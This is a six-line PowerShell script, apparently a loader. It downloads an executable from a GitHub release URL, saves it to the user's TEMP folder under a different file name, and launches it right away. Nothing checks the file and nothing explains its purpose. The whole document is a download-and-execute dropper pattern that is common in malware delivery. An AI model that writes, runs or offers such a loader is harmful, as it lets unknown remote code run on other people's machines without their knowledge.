$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebahola/oconsole.exe"
$destino = [System.IO.Path]::Combine($env:TEMP, "codigo2.exe")

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $destino)
Start-Process -FilePath $destino